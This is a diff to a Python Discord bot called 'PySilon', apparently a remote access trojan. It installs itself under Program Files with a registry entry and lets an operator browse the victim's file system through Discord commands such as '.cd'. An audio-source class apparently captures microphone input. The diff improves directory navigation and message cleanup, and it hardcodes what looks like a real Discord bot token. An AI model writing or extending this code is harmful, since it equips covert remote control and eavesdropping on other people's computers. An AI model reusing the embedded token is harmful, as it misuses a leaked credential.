@@ -33,7 +33,7 @@ from resources.misc import *
 # - Please check out README.md before  - #
 # -   you change following settings    - #
 
-bot_token = ''   # Paste here BOT-token
+bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
 software_registry_name = 'PySilon'   # -------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
@@ -112,6 +112,8 @@ async def on_raw_reaction_add(payload):
             await message.pin()
             last_message = await discord.utils.get(message.channel.history())
             await last_message.delete()
+        elif str(reaction) == '🔴':
+            await message.delete()
 
 @client.event
 async def on_raw_reaction_remove(payload):
@@ -121,7 +123,6 @@ async def on_raw_reaction_remove(payload):
 
     if str(reaction) == '📌':
         await message.unpin()
-
 
 @client.event
 async def on_message(message):
@@ -144,22 +145,25 @@ async def on_message(message):
         if message.channel.id == channel_ids['file']:
             print('yes')
         else:
-            await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
+            reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
     elif message.content[:3] == '.cd':
         await message.delete()
         if message.channel.id == channel_ids['file']:
             if message.content == '.cd':
-                await message.channel.send('```Syntax: .cd <directory>```')
+                reaction_msg = await message.channel.send('```Syntax: .cd <directory>```'); await reaction_msg.add_reaction('🔴')
             else:
                 if os.path.isdir('/'.join(working_directory) + '/' + message.content[4:]):
-                    working_directory.append(message.content[4:])
-                    await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```')
+                    if message.content[4:] == '..':
+                        working_directory.pop(-1)
+                    else:
+                        working_directory.append(message.content[4:])
+                    reaction_msg = await message.channel.send('```You are now in: ' + '/'.join(working_directory) + '```'); await reaction_msg.add_reaction('🔴')
                 else:
                     reaction_msg = await message.channel.send('```❗ Directory not found.```'); await reaction_msg.add_reaction('🔴')
 
         else:
-            await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||')
+            reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
 
 class PyAudioPCM(discord.AudioSource):
     def __init__(self, channels=2, rate=48000, chunk=960, input_device=1) -> None:
